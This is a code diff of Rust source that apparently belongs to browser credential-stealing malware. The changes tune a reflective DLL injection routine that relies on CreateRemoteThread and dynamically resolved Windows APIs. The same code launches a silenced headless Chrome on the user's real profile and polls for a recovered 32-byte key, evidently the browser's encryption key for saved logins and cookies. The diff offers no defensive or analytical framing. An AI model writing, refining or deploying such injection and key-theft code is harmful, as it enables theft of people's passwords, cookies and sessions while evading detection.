@@ -386,7 +386,7 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
     }
     let thr = dynapi::CreateRemoteThread(proc, std::ptr::null_mut(), 0, std::mem::transmute(stub_remote), std::ptr::null_mut(), 0, std::ptr::null_mut());
     if thr.is_null() || thr as isize == -1 { return Err(()); }
-    dynapi::WaitForSingleObject(thr, 15000);
+    dynapi::WaitForSingleObject(thr, 20000);
     dynapi::CloseHandle(thr);
 
     Ok(())
@@ -405,10 +405,27 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
 
     let mut parts: Vec<String> = Vec::new();
     parts.push(format!("\"{chrome_exe}\""));
-    let flags = ["--headless=new","--disable-gpu","--disable-logging","--log-level=","3","--disable-background-networking","--disable-sync","--disable-default-apps","--disable-extensions","--disable-component-update","--no-first-run","--no-default-browser-check","--noerrdialogs","--disable-dev-tools","--disable-features=Translate","--disable-ipc-flooding-protection","--disable-breakpad","--metrics-recording-only","--user-data-dir="];
+    let flags = [
+        "--headless=new",
+        "--disable-gpu",
+        "--disable-logging",
+        "--log-level=3",
+        "--disable-background-networking",
+        "--disable-sync",
+        "--disable-default-apps",
+        "--disable-extensions",
+        "--disable-component-update",
+        "--no-first-run",
+        "--no-default-browser-check",
+        "--noerrdialogs",
+        "--disable-dev-tools",
+        "--disable-features=Translate",
+        "--disable-ipc-flooding-protection",
+        "--disable-breakpad",
+        "--metrics-recording-only",
+    ];
     for f in &flags { parts.push(f.to_string()); }
-    let last_idx = parts.len() - 1;
-    parts[last_idx] = format!("{}\"{}\"", parts[last_idx], profile_str);
+    parts.push(format!("--user-data-dir=\"{}\"", profile_str));
     let cmdline = parts.join(" ");
 
     let exe_w = wide(chrome_exe);
@@ -421,7 +438,7 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         if cp_ok == 0 { return Err(()); }
         let pid = pi.dwProcessId;
 
-        std::thread::sleep(std::time::Duration::from_millis(2000));
+        std::thread::sleep(std::time::Duration::from_millis(3000));
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
         if dll_bytes.is_empty() { dynapi::CloseHandle(pi.hThread); dynapi::CloseHandle(pi.hProcess); return Err(()); }
         let result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
@@ -499,9 +516,8 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     };
     if !injected { return None; }
 
-    for i in 0..60 {
+    for _i in 0..60 {
         if result_path.exists() {
-
             if let Some(key) = read_key_from_result(&result_path) {
                 if key.len() == 32 { return Some(key); }
             }
